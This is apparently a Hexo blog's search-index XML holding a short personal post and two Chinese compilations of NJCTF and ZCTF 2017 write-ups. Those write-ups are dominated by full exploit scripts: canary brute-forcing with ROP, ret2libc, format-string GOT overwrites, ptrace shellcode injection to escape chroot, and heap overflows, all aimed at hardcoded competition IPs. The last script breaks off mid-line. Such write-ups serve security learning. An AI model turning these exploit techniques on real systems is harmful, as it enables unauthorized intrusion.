<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[定一个小目标]]></title>
    <url>%2F2017%2F06%2F16%2F%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%9B%AE%E6%A0%87%2F</url>
    <content type="text"><![CDATA[这是一个小目标。 今天，算是我的blog的第二个生日吧，在2016第一次搭建成功之后便在没有怎么管理过它，只是僵硬的往上传一些做题的writeup，那为什么还要搭建它，直接做一个笔记不就好了? 上周的聚会中和已经工作的学长作了一次深入的交谈，让我了解到了blog的重要，好好对待，它也许能助你成功，不好好对待它也就是一个高级一点的笔记本，恐怕也只有你自己能够进行阅读，毫无意义。 从前天开始对我的blog进行了主题修改，对一些小功能进行了完善，自行添加了一些小的插曲，自此，要求不高，多多上传一些自己的见解，把blog利用起来，学习之路还要继续向前。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NJCTF writeup总结]]></title>
    <url>%2F2017%2F03%2F17%2FNJCTF-writeup%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[NJCTF上大牛们整理出来的解题思路，我给总结下。 ###PWN-messagner一开始以为是ssp-leak后来发现是逐个逐个爆破cannary，然后rop就没了,本来在找rop的，结果发现出题人留了rop链在里面。 #coding:utf-8 from pwn import * #__author__=&apos;simp1e&apos; import struct import binascii PROC_NAME=&apos;./messager&apos;#PORC_NAME context.arch=&apos;i386&apos; proc_elf=ELF(PROC_NAME) print proc_elf.checksec() context.log_level = &apos;debug&apos; for i in proc_elf.libs: if i.find(&apos;libc.so.6&apos;)!=-1: LOCAL_LIBC_PATH=i L_LIBC=ELF(LOCAL_LIBC_PATH) def exp(io,choice,libc): ll=log global code_base global cookies ll.debug(&apos;get_libc_offset&apos;) for i in libc.search(&apos;/bin/sh&apos;): offset_bin_sh=i break offset_system=libc.symbols[&apos;system&apos;] offset_one_function=libc.symbols[&apos;puts&apos;] print &apos;[offset]&apos; print &apos;sys-&gt;0x%x\nbinsh-&gt;0x%x\nputs-&gt;0x%x&apos;%(offset_system,offset_bin_sh,offset_one_function) cookies=&apos;\x00\xc1\xa6\x43\xe3\x04\x69\xa0&apos; cookies=&apos;\x00\x60\x58\xd8\x67\xaa\x83\x1e&apos;#006058d867aa831e iip=&apos;127.0.0.1&apos; port=5555 if choice==2: iip=&apos;218.2.197.234&apos; port=2090 cookies=&apos;\x00\xa0\xd7\x1c\x73\x4e\x74\x22&apos;#00bd4af811ae0e38 pop_rsi_2ret=0x0000000000400fb1 pop_edi_ret=0x0000000000400fb3 while 1: if len(cookies)==8: break for i in range(1,0xff): data=io.recv() #print &apos;ddd&apos;+data data=p64(0x602160)*13+cookies+chr(i) print &apos;try----%d&apos;%(i) &apos;&apos;&apos; if choice==3: raw_input(&apos;gdb attach!!!&apos;) #&apos;&apos;&apos; io.send(data) try: io.recv() cookies+=&apos;%c&apos;%(i) print &apos;leak-&gt;cookies-&gt;&apos;+cookies.encode(&apos;hex&apos;) #raw_input(&apos;---------&apos;) io.close() io=remote(iip,port) break except Exception, e: io.close() io=remote(iip,port) continue io.close() io=remote(iip,port) #io.interactive() #+p64(0x400eb0)+p64(0x602160)*0x1 print &apos;0x%x&apos;%(u64(cookies)) n_rbp=0x7ffcb0dd5a80 dd=p64(0x602160)*13+cookies+p64(n_rbp) rop = ROP(PROC_NAME) rop.call(proc_elf.plt[&apos;send&apos;],[0x602120,0x602160,0x100,0]) print rop.dump() real_rop=p64(pop_edi_ret)+p64(0x602120)+p64(pop_rsi_2ret)+p64(0x40108a)+p64(0x602160)+p64(proc_elf.plt[&apos;send&apos;])+p64(0x400) data=dd+p64(0x400bc6) #&apos;&apos;&apos; if choice==3: raw_input(&apos;gdb attach!!!&apos;) #&apos;&apos;&apos; io.sendline(data) io.interactive() if __name__==&apos;__main__&apos;: print &apos;Press 1 to test on local\nPress 2 to remote pwn\nPress 3 to test nc on local&apos; try: choice=int(raw_input(&apos;input &gt;&apos;).strip(&apos;\n&apos;)) except: print &apos;Press error,Choice default set to 1&apos; choice=1 if choice==1: r= process(PROC_NAME) exp(r,choice,L_LIBC) elif choice==2: r= remote(&apos;218.2.197.234&apos; , 2090 ) #r= process(PROC_NAME) try: R_LIBC=ELF(&apos;./remote_libc&apos;) except: R_LIBC=L_LIBC print &apos;Alert! remote libc no found,default set to local libc&apos; exp(r,choice,R_LIBC) elif choice==3: r=remote(&apos;127.0.0.1&apos;,5555) exp(r,choice,L_LIBC) ###pwn-233有libc就行了，然后爆破就行，反正32嘛 import time from pwn import * context.log_level = &apos;debug&apos; libc_base = 0xf772f000#brute offse_sys = libc_base + 0x3fe70 offse_bsh = libc_base + 0x0015da8c def exp(): io = remote(&apos;106.14.22.20&apos;, 23743) payload = &apos;c&apos;*0x16 + p32(offse_sys) + &apos;a&apos;*4 + p32(offse_bsh) io.sendline(payload) sleep(2) io.sendline(&apos;echo simp1e&apos;) d = io.recv(timeout=1) if &apos;simp1e&apos; not in d: io.close() return print &apos;!!!!!!&apos; io.interact() if __name__ == &apos;__main__&apos;: tt=0 while 1: print &apos;tyyy:%d&apos;%(tt) tt += 1 try: exp() except: pass NJCTF{W0W_Vd50_i5_C00L!!} ###PWN-vegas题目不难。想到思路之后就是写脚本的事情了。 一个猜数字奇偶的游戏。猜对了就能向数组里写一个字节。数字的生成方式是以时间为种子生成的16个初始随机数，然后再以一个稀奇古怪的算法生成的数字。不过好在每一次猜测随机数的时候都会给出随机数的值。所以只要爆破时间种子，然后以相同的随机数生成算法来计算就能够预测随机数了 （我能吐槽服务器时间很本机差了大概2500秒吗?异空间中的服务器？） 一旦能预测随机数，这个题目就是一个简单的栈溢出了。就是在main函数结尾的时候有一句 esp的值是根据ecx的值确定的。额ecx又是从栈里面pop出来的。而栈里的值因为溢出而被覆盖了。不过也不麻烦，因为 这个puts会把栈里面的值给输出出来。溢出的时候找好位置读取一下栈的位置就好了。 from pwn import * import v import ctypes import time context.log_level = &apos;debug&apos; target = process(&apos;./vegas&apos;) #target = remote(&apos;218.2.197.235&apos;,23747) t = [0 for i in range(16)] s = 0xb def init(seed): s = 0xb libc = ctypes.cdll.LoadLibrary(&apos;./libc.so.6&apos;) libc.srand(seed) for i in range(16): t[i] = libc.rand() def get_ran(): global s global t v0 = s v1 = t[s] v2 = (s+15)&amp;0xf v3 = t[(s+13)&amp;0xf] v4 = t[v2] v5 = t[s] &lt;&lt; 16 v5 = v5 &amp; 0xffffffff s = (s+15)&amp;0xf v6 = v3^v5^v1^(v3&lt;&lt;15) v6 = v6 &amp; 0xffffffff v7 = t[(v0+9)&amp;0xf]^(t[(v0+9)&amp;0xf]&gt;&gt;11) t[(v0+10)&amp;0xf] = v7^v6 r = ((8*(v7^v6))&amp;0xDEADBEE8)^(v7&lt;&lt;24)^(v6&lt;&lt;10)^v7^v4^(2*v4) r = r &amp; 0xfffffff t[v2] = r return r def guess(i,data): ss = &apos;&apos; target.recvuntil(&apos;Choice:\n&apos;) target.sendline(&apos;1&apos;) target.recvuntil(&apos;3. Not sure\n&apos;) target.sendline(str(i)) target.recvuntil(&apos;The number is &apos;) num = target.recvline() num = int(num[:-1],16) r = target.recvline() if &apos;Right&apos; in r: target.recvuntil(&apos;step:\n&apos;) target.sendline(data) ss = target.recvline() target.recvuntil(&apos;score: &apos;) s = target.recvline() s = int(s[:-1]) return num,s,ss def win(data): if get_ran()&amp;1 == 1: return guess(1,data)[2] else: return guess(2,data)[2] def lose(): if get_ran()&amp;1 == 1: guess(2,&apos;1&apos;) else: guess(1,&apos;1&apos;) ran,score,tmp = guess(1,&apos;1&apos;) seed = int(time.time())+10000 while True: init(seed) if get_ran() == ran: break else: seed -= 1 if score == 1: lose() else: win(&apos;1&apos;) elf = ELF(&apos;./vegas&apos;) rop = ROP(elf) rop.read(0,0x0804B0C0,16) rop.system(0x0804B0C0) data = &apos;a&apos;*31# + &apos;b&apos;*12 + str(rop) for i in data: win(i) addr = win(&apos;a&apos;) print addr raw_input() addr = addr[32:36] addr = u32(addr) - 20 data2 = p32(addr+4) + &apos;aaaa&apos; + p32(addr+4) + str(rop) for i in data2: win(i) target.sendline(&apos;3&apos;) target.sendline(&apos;/bin/sh;\x00&apos;) target.interactive() ###PWN-syscallhelper题目本身漏洞不难。主要考验写shellcode的功底。 这里的索引可以为负数。写个-10就就可以覆盖到虚表了。覆盖虚表的指针指向的内容还是可控的。 首先写个指向puts指针进去，然后调用一下就可以获得到堆的地址。然后再覆盖一次虚表指向堆上的shellcode就可以了。这里有一个问题是本地和远程的堆偏移不太一样。远程因为有默认的syscall table。所以偏移和本地不一样。解决方法也很简单，直接堆喷shellcode然后稍微跑一下偏移就能解决了。 恩，shellcode是可以执行了。但是chroot还是个问题。写了一个列目录的shellcode，发现flag不在jail目录下。好吧，还得绕过chroot去上层目录才行。 写shellcode用getuid确认了远程进程的权限是root。而chroot对当前进程和其子进程是无解的。那就只能对父进程下手了。最后写个一个ptrace的shellcode。通过调试父进程，将shellcode注入父进程的方法来让父进程弹shell。最终搞到了flag。 from pwn import * context.log_level = &apos;debug&apos; shellcode = &apos;&apos; shellcode += asm(shellcraft.i386.linux.echo(&apos;123&apos;)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(0x10, &apos;edi&apos;, 0,0)) shellcode += asm(shellcraft.i386.linux.push(&apos;eax&apos;)) shellcode += asm(shellcraft.i386.linux.write(1,&apos;esp&apos;,4)) shellcode += asm(shellcraft.i386.linux.waitpid(-1,0,2)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*0, 795371626)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*1, 1752379183)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*2, 1852400175)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*3, 2304248682)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*4, 2580099555)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*5, 16875725)) shellcode += asm(&apos;mov edi,[0x0804E158]&apos;) shellcode += asm(&apos;add edi, 1&apos;) shellcode += asm(shellcraft.i386.linux.ptrace(0x11, &apos;edi&apos;, 0, 0)) #shellcode += asm(shellcraft.i386.infloop()) #t = process(&apos;./syscallhelper&apos;) t = remote(&apos;218.2.197.234&apos;, 2088) def leave(): t.recvuntil(&apos;option:\n&apos;) t.sendline(&apos;5&apos;) t.recvuntil(&apos;length\n&apos;) t.sendline(&apos;16384&apos;) t.recvuntil(&apos;message\n&apos;) t.sendline(&apos;\x90&apos;*(16380-len(shellcode))+shellcode) def add(name,addr): t.recvuntil(&apos;option:\n&apos;) t.sendline(&apos;2&apos;) t.recvuntil(&apos;name\n&apos;) t.sendline(name) t.recvuntil(&apos;number\n&apos;) t.sendline(&apos;3343&apos;) t.recvuntil(&apos;count(argc)\n&apos;) t.sendline(&apos;-10&apos;) t.recvuntil(&apos;0 to stop\n&apos;) t.sendline(&apos;-10&apos;) t.recvuntil(&apos;value\n&apos;) t.sendline(p32(addr)) t.recvuntil(&apos;0 to stop\n&apos;) t.sendline(&apos;0&apos;) def call(name): t.recvuntil(&apos;option:\n&apos;) t.sendline(&apos;1&apos;) t.recvuntil(&apos;call name:\n&apos;) t.sendline(name) t.recvuntil(&apos;option:\n&apos;) t.sendline(&apos;3&apos;) for i in range(5): leave() add(&apos;explorer&apos;,0x08048D30) call(&apos;explorer&apos;) heap = t.recv(4) heap = u32(heap) - 0xd0 print hex(heap) shell = heap + 0x1 + 0x10000*3 add(&apos;explorer1&apos;,shell) call(&apos;explorer1&apos;) t.interactive() ###PWN-vsvs先爆破code，得到第一层code为22，然后有个溢出，直接传/bin/sh就能拿flag了： #!/usr/bin/python # -*- coding: utf-8 -*- from pwn import * import time REMOTE = 0 LOCAL_REMOTE = 1 LOCAL = 2 rhost = &quot;218.2.197.235&quot; rport = 23749 flag = REMOTE debug = 0 def GetConnection(): if flag == LOCAL_REMOTE: conn = remote(lhost,lport) libc_addr = libc_addr_local elif flag == REMOTE: conn = remote(rhost,rport) libc_addr = libc_addr_remote elif flag == LOCAL: conn = process(local_bin) libc_addr = libc_addr_local return conn,libc_addr exp = 1024*&quot;d&quot; + &quot;/bin/sh&quot; conn,libc_addr = GetConnection() conn.sendlineafter(&quot;access code:\n&quot;,&quot;22&quot;) conn.sendlineafter(&quot;input:&quot;,exp) conn.sendlineafter(&quot;?&quot;,exp) conn.interactive() ###PWN-pingme又是一个没有给二进制程序的题目…首先要想办法把二进制文件dump下来。测试了一下发现存在格式化字符串漏洞 于是写个脚本把二进制程序给弄出来 from pwn import * import os io = remote(&apos;218.2.197.235&apos;,23745) context.log_level = &apos;debug&apos; def get_content(addr): io.sendline(p32(addr) + &apos;%7$s&apos;) io.recvuntil(p32(addr)) content = io.recvuntil(&apos;\n&apos;)[:-1] return content io.recvuntil(&apos;Ping me\n&apos;) fp = open(&apos;./pingme&apos;, &apos;ab+&apos;) idx = 0x8048000 + os.path.getsize(&apos;./pingme&apos;) #idx = 0x8048001 #fp.write(&apos;\x7f&apos;) while True: if idx &amp; 0xff == 00 or idx &amp; 0xff == 10: fp.write(&apos;\x00&apos;) idx += 1 continue ans = get_content(idx) if ans: fp.write(ans) idx += len(ans) else: fp.write(&apos;\x00&apos;) idx += 1 然后dump出来的程序不知道为什么没有plt……有点麻烦，勉强能看 简单的存在一个printf。直接利用这个就可以得到shell from pwn import * import os io = remote(&apos;218.2.197.235&apos;,23745) context.log_level = &apos;info&apos; def get_content(addr): io.sendline(p32(addr) + &apos;%7$s&apos;) io.recvuntil(p32(addr)) content = io.recvuntil(&apos;\n&apos;)[:-1] return content io.recvuntil(&apos;Ping me\n&apos;) printf_got = 0x8049974 read_got = 0x8049978 puts_got = 0x8049980 strlen_got = 0x8049988 printf_libc = u32(get_content(printf_got)[:4]) log.info(&apos;printf :&apos; + hex(printf_libc)) read_libc = u32(get_content(read_got)[:4]) log.info(&apos;read :&apos; + hex(read_libc)) puts_libc = u32(get_content(puts_got)[:4]) log.info(&apos;puts :&apos; + hex(puts_libc)) #strchr_libc = u32(get_content(strchr_got)[:4]) #log.info(&apos;strchr :&apos; + hex(strchr_libc)) system_libc = printf_libc - 0x00049020 + 0x0003a940 print hex(system_libc) high = (system_libc &gt;&gt; 16) &amp; 0xffff low = (system_libc &amp; 0xffff) print hex(high), hex(low) #payload = &apos;%0&apos; + str((system_libc &amp; 0xffff) - 4) + &apos;x&apos; + p32(strlen_got) + &apos;%9$hn&apos; payload = &apos;%&apos; + str(low - 4).rjust(6, &apos;0&apos;) + &apos;x&apos; + p32(strchr_got) payload += &apos;%9$hn&apos; payload += &apos;%&apos; + str(high - low - 4).rjust(5, &apos;0&apos;) + &apos;x&apos; + p32(strlen_got + 2) payload += &apos;%13$hn&apos; pause() print payload io.sendline(payload) print io.recvuntil(&apos;\n&apos;) io.sendline(&apos;/bin/sh &apos;) io.interactive() ###RE-first首先逆向一下程序，发现是和时间有关，并且和输入有关的。我们必须得想办法确定输入才行。 程序创建了6个线程，每个线程对input的4位进行MD5了之后取前16位和602120位置的数值进行比较 我们可以解出这些md5然后在比较的位置下断点，恢复这些4个字母的字符串顺序，得到应该存在的输入然后就是要爆破时间我们写个脚本来实现 import lowkey import subprocess import time while True: p = subprocess.Popen(&apos;./first&apos;, stdout=subprocess.PIPE, stdin = subprocess.PIPE) out, _ = p.communicate(input = b&apos;juhuhfenlapsiuerhjifdunu\n&apos;) if &apos;Here&apos; in out: print out time.sleep(0.1) ###RE-echo sever这个题目比较的简单，实际上就是IDA解析的时候把数据解析成指令了。我们手动恢复一下就好了。有个strncmp的比较，比较下输入是不是F1@gA，是的话就输出这个字符串的md5。输出的MD5就是flag ###RE-on the fly是一个用d语言写的程序找这样一个脚本，跑一下就能得到结果https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/reverse/deedeedee-150/solve.py 一共两个Activity，逻辑类似，通过对传入的参数进行计算，直接遍历 ###apk-safeboxapk改之理解析出源代码最后看算法写出爆破脚本即可。 for i in xrange(10000000,99999999): i1 = 10000000 j=1 n=1 if ((abs(i / 1000 % 100-36 ) == 3) &amp; (i % 1000 % 584 == 0)): for k in (0,3): if (i / j % 10 == i / i1 % 10): for c1 in xrange(48,122): for c2 in xrange(48,122): for c3 in xrange(48,122): if((c3 == i / 1000000)&amp;(c2 == i / 10000 % 100)&amp;(c1 == i / 100 % 100+10)): print (c3) print (c2) print (c1) j=j*10 i1=i1/10 ###apk-LittleRotatorGame临时学 科学上网:https://developer.android.com/reference/android/app/NativeActivity.html 从android_main函数的前面代码看出，这就是官网给的样例，通过获取的加速度传感器的数据然后搞搞搞 在调用模式下看到一堆的块以及各种调用看出这是用了O-LLVM混淆 各种摸索下，发现获取的传感器数据会传入 a_process(int, int, int)然后把返回值存到R7进行对比某值 跟入 ，发现该函数返回的值取值在 之间 再看后面对比的地方 .rodata:0000785C ; signed int *dword_785C[10] .rodata:0000785C dword_785C DCD 2, 7, 5, 3, 2, 9, 4, 1, 3, 6 也就是说在获取到传感器的数据后，会调用a_process函数进行处理然后将返回值跟一数组的值进行对比，一共10个数字，也就是会对比10次，但是有一个问题， 获取的数字在 之间，而对比的数组有7和9, 此时我们注意到边上还有一个b_process，查看调用 前面在调用 a_process 的时候将返回值存储在R7，这里会在调用完后进行判断，如果返回值是6，会调用b_process 虽然中间隔得有点远 再整理一遍就是，会不断获取传感器数据，将传感器数据传入a_process ，然后判断返回值，如果返回值是6，则调用 b_process ，并将结果跟6相 加，再返回跟数组对比，十次对比全部一样应该就可以输出Flag 接下来动态调试 直接使用IDA attach上应用，没有发现反调试，找到so的加载地址，静态分析出两个函数偏移，加上加载基址，按g跳过去下断点，然后慢慢边跑 代码边修改R0的值即可 在调用完后下断点同样在 b_process 函数调用后一条指令下断点 中间出现好多条 Nice,Go on! ctfer 之后出现flag 03-26 06:26:27.648: I/an-activity(16735): The flag is:njctf{PvrNa7iv3Al1} ###apk-easycrack 不是很复杂的安卓逆向题。java层几乎没有什么东西，而lib库也提供了x86指令集的版本。所以其实就是个正常的逆向题而已。 java代码里面值得注意的代码只有这个messageMe。将apk的包名easycrack进行一次循环亦或。然后返回。 然后就是看看静态的parseText函数。 首先是将输入和messageMe的返回值做一次异或。这一段很简单。 最后是一段rc4的代码。已经看到不下4次rc4了。一看这sbox的初始方式就是rc4了。 所以解密也很简单。rc4的加密和解密是一样的代码。异或之类的运算也是可逆的。掏出祖传的rc4解密脚本改一改就能出flag了。 ram = &apos;I_am_the_key&apos; def getstr(string): table = [] for i in range(256): table.append(i) v10 = 0 for i in range(256): v10 = (table[i] + v10 + ord(ram[i%len(ram)]))%0x100 table[i],table[v10] = table[v10],table[i] v12 = 0 v13 = 0 s = &apos;&apos; for i in range(len(string)): v12 = (v12 + 1)%0x100 v13 = (v13 + table[v12])%0x100 table[v12],table[v13] = table[v13],table[v12] s += chr(ord(string[i]) ^ table[(table[v12]+table[v13])%0x100]) return s f = getstr(&apos;C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4&apos;.decode(&apos;hex&apos;)) #print f.encode(&apos;hex&apos;) m = &apos;easycrack&apos; n = &apos;&apos; c = 51 for i in range(len(m)): c ^= ord(m[i]) n += chr(c) #print n.encode(&apos;hex&apos;) flag = &apos;&apos; for i in range(len(f)): flag += chr(ord(f[i]) ^ ord(n[i%len(n)])) print flag]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ZCTF writeup总结]]></title>
    <url>%2F2017%2F03%2F16%2FZCTF-writeup%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[ZCTF结束，大牛们整理了解题思路，我给整理总结下 ###Reverse-QExtend这个程序有少量混淆，第一个是用call+pop指令使得ida没法正常反编译，第二个是修改了函数的返回地址。 在ida中进行修复到能正常f5. 分析功能，发现是个汉诺塔游戏。 初始状态: 需要达到的状态: 各操作码对应的操作： 手工完了下汉诺塔，得到的最短路径为053254104123104524104操作码为input[i]%16-1，所以爆破了一下input，最终得到的flag为:ZCTF{A&amp;$#&amp;5rA5r#$rA5&amp;#5rA5} ###Reverse-EasyReverse符号没去掉，encrypt_str函数，逆向完后发现是xtea算法，秘钥为： print (chr(222)+chr(173)+chr(190)+chr(239)).encode(&quot;hex&quot;) deadbeef 处理一下xtea解密即可得到flag，16字节有些许问题，补齐，然后利用python的xtea解密即可： from xtea import * x = new(k, mode=MODE_ECB) print x.decrypt(v5) ###Reverse-CryptTab 首先是一个压缩包，有密码，不过在文件的末尾得到了压缩密码，解压得到一个data文件。 看起来像shellcode，就用ida打开分析。发现对0x17开始的0x2200字节进行了0xcc异或操作。异或之后分析发现后面有一个dll，将其提取出来，用ida打开，可以发现导出了一个Encrypt函数。 从程序上看代码异或解密完之后直接跳转到sub_17函数。分析sub_17函数，发现是一个获取kernel32.dll的地址，然后就执行不下去了，坑。 从ida的调用图上猜这儿应该跳转到sub_131。 分析sub_131，有发现需要参数ebx，但是ebx赋什么并不知道，坑。 后来分析到sub_44，该函数为获取库函数的地址，第一个参数为dll的地址，第二个参数为函数的hash值，第二个参数从[ebx+1]处取得。 因为shellcode一般需要获取LoadLibraryA函数地址，算了一下LoadLibraryA的hash值为0xec0e4e8e，然后在shellcode中搜索这个值，还真找到了。 string = &apos;LoadLibraryA&apos; def rol(a): return ((a&lt;&lt;0x13) | (a&gt;&gt;(32-0x13)))&amp;0xffffffff c = 0 for i in range(len(string)): c = rol(c) + ord(string[i]) print hex(c) 所以ebx的值应该为0x310。 向下分析，可以看到程序得到了LoadLibrayA、VirtualAlloc和VirtualFree3个函数的地址，然后又执行不下去了，坑。 然后就对着函数猜了。 应该就是对0x156处的0x10个字节和0x166处的0x30字节作为输入，加密得到的值与0x19a处的0x30字节进行比较。 后面就是分析Encrypt函数，各种交换移位，我这种算法渣只能想到爆破了。 注：以下代码格式有修改，请读者自行调整。int main(){ unsigned char str[0x100] = “\xF3\x23\xB5\xA6\xF5\x6A\xCB\x88\xD2\xC6\xD2\x2F\x32\xB9\xC3\xAA\x32\x9E\xAD\xEE\x8C\x22\x2D\x45\x62\x67\xFB\xD9\x64\x46\xF8\xE7\xC8\x20\x35\x86\xE9\x98\xBF\xD5\x55\xCA\x8B\x85\x67\x76\x19\x9A”; printf(&quot;len=%d\n&quot;, strlen((char*)str)); HMODULE handle = LoadLibraryA(&quot;DLL_Export.dll&quot;); ENCRYPT ProcAddr; ProcAddr = (ENCRYPT)GetProcAddress(handle, &quot;Encrypt&quot;); printf(&quot;%x\n&quot;, ProcAddr); unsigned char c1[]= &quot;\x21\x23\x25\x26\x2a&quot;; unsigned char c3[]=&quot;\x43\x45\x47\x49\x4b&quot;; unsigned char c2[]=&quot;\x35\x36\x37\x38\x39&quot;; unsigned char input[17]; //for(int i0=0;i0&lt;5;i0++) int i0 =4; printf(&quot;i0=%d\n&quot;, i0); { for(int i1=0;i1&lt;5;i1++) { printf(&quot;i1=%d\n&quot;, i1); for(int i2=0;i2&lt;5;i2++) { for(int i3=0;i3&lt;5;i3++) { printf(&quot;i3=%d\n&quot;, i3); for(int i4=0;i4&lt;5;i4++) { for(int i5=0;i5&lt;5;i5++) { for(int i6=0;i6&lt;5;i6++) { for(int i7=0;i7&lt;5;i7++) { for(int i8=0;i8&lt;5;i8++) { for(int i9=0;i9&lt;5;i9++) { for(int i10=0;i10&lt;5;i10++) { for(int i11=0;i11&lt;5;i11++) { for(int i12=0;i12&lt;5;i12++) { for(int i13=0;i13&lt;5;i13++) { for(int i14=0;i14&lt;5;i14++) { input[0] = c1[i0]; input[1] = c2[i1]; input[2] = c3[i2]; input[3] = c1[i3]; input[4] = c2[i4]; input[5] = c3[i5]; input[6] = c1[i6]; input[7] = c2[i7]; input[8] = c3[i8]; input[9] = c1[i9]; input[10] = c2[i10]; input[11] = c3[i11]; input[12] = c1[i12]; input[13] = c2[i13]; input[14] = c3[i14]; input[15] =&apos;\x24&apos;; input[16]=&apos;\x00&apos;; unsigned char data[0x100] = &quot;\x38\x9B\x50\xCE\x86\xDD\xF0\x1D\x0D\xC3\xD6\xE2\xF2\x29\xD3\x83\x6C\xE8\x86\x5F\x95\xE6\x4F\x63\x5F\x3B\x9B\x5F\x53\xBC\x41\x2A\x49\x08\x02\xAA\x10\xEC\x2C\x58\xD5\x27\xCD\x93\x38\x10\xE4\xDC&quot;; unsigned char * output; __asm { push esi lea esi, input push esi lea esi, data; call ProcAddr mov output, eax pop eax pop esi } if(!memcmp(output, str, 0x30)) { printf(&quot;%s\n&quot;, input); } } } } } } } } } } } } } } } } } 爆出来为:%6K#7E&amp;5C*9G!8I$当然这还不是最终结果，还要用这个作为密钥，去AES解密加密表，才能得到flag。。。 ###Pwn-loginsprintf里面的格式化字符串的内容可以被自身的格式化给覆盖掉，把%s:%s覆盖掉，覆盖成%hhn，然后格式化来改写check_stack_fail的最后一字节，拿shell的时候 ，不能用system拿，不能用system拿，环境变量被栈覆盖掉了： from zio import * target = (&quot;58.213.63.30&quot;,4002) def get_io(target): r_m = COLORED(RAW, &quot;green&quot;) w_m = COLORED(RAW, &quot;blue&quot;) io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m) return io def gen_rop_data(func_addr, args, pie_text_base = 0): p_ret = [0x0804844e, 0x08048465, 0x0804891a, 0x08048919, 0x08048918] rop_data = &apos;&apos; rop_data += l32(func_addr) if len(args) &gt; 0: rop_data += l32(p_ret[len(args)] + pie_text_base) for arg in args: rop_data += l32(arg) return rop_data def pwn(io): puts_got = 0x0804a01c offset_puts = 0x656a0 puts_plt = 0x080484c0 read_plt = 0x08048480 read_buff_addr = 0x0804862B check_stack_fail_got = 0x804A014 bss_addr = 0x0804a000 + 0xe20 leave_ret = 0x08048715 pop_ebp_ret = 0x0804871f #: pop ebp ; ret username = &quot;&quot; #username += &apos;bbbb&apos; username += l32(check_stack_fail_got) username += &quot;a&quot;*0x4C #username += &quot;bbbb&quot; username += gen_rop_data(puts_plt, [puts_got]) username += gen_rop_data(read_buff_addr, [bss_addr, 0x01010101]) username += l32(pop_ebp_ret) + l32(bss_addr) username += l32(leave_ret) #username += gen_rop_data(puts_plt, [puts_got+4]) print hex(len(username)), hex(0xd6 - 0x5c - 4) #username = username.ljust(0xd6 - 0x5c - 4, &apos;a&apos;) #username += &quot;%s:%s.%p.%p.%p.%p.%p&quot;# + &quot;%p.&quot;*4 #username += &quot;%x.&quot;.ljust(8, &apos;-&apos;)*10 #username += &quot;aa:&quot; username = username.ljust(0xc0, &apos;a&apos;) username += &apos;a&apos;*(0x66-0x43) username += &quot;%9$hhn.&quot;.ljust(10, &apos;-&apos;) #username += &quot;%9$p.&quot;.ljust(10, &apos;-&apos;) username = username.ljust(0x100-1, &apos;a&apos;) password = &quot;&quot; password += &apos;w&apos; * 0x40 io.read_until(&quot;:&quot;) io.writeline(username) io.read_until(&quot;:&quot;) #io.gdb_hint() io.writeline(password) io.read_until(&quot;&quot;) io.read_until(&quot;Login successful!\n&quot;) io.read_until(&quot;\n&quot;) data = io.read_until(&quot;\n&quot;) print data puts_addr = l32(data[:4]) offset_system = 0x3e800 offset_execve = 0xB59F0 #&quot;&quot;&quot; #remote offset_system = 0x3fe70 offset_puts = 0x64da0 offset_execve = 0xB4EA0 #&quot;&quot;&quot; libc_base = puts_addr - offset_puts system_addr = libc_base + offset_system execve_addr = libc_base + offset_execve payload = &quot;&quot; payload += l32(0x0) payload += gen_rop_data(execve_addr, [bss_addr+0x100, 0, 0]) payload = payload.ljust(0x100, &apos;a&apos;) payload += &quot;/bin/sh\x00&quot; payload += l8(0x1f) io.gdb_hint() io.writeline(payload) io.interact() io = get_io(target) pwn(io) ###Pwn-Dragon存在堆溢出，可以修改堆结构中的size.脚本如下： from pwn import * #r = remote(&apos;58.213.63.30&apos;, 11501) r = process(&quot;./dragon&quot;) def add(size, name, content): r.recvuntil(&apos;&gt;&gt;&apos;) r.sendline(&apos;1&apos;) r.recvuntil(&apos;:&apos;) r.sendline(str(size)) r.recvuntil(&apos;:&apos;) r.sendline(name) r.recvuntil(&apos;:&apos;) r.sendline(content) def edit(id, content): r.recvuntil(&apos;&gt;&gt;&apos;) r.sendline(&apos;2&apos;) r.recvuntil(&apos;:&apos;) r.sendline(str(id)) r.recvuntil(&apos;:&apos;) r.write(content) def show(id): r.recvuntil(&apos;&gt;&gt;&apos;) r.sendline(&apos;4&apos;) r.recvuntil(&apos;:&apos;) r.sendline(str(id)) def delete(id): r.recvuntil(&apos;&gt;&gt;&apos;) r.sendline(&apos;3&apos;) r.recvuntil(&apos;:&apos;) r.sendline(str(id)) add(0x20, &apos;AAAA&apos;, &apos;AAAA&apos;) add(0x20, &apos;AAAA&apos;, 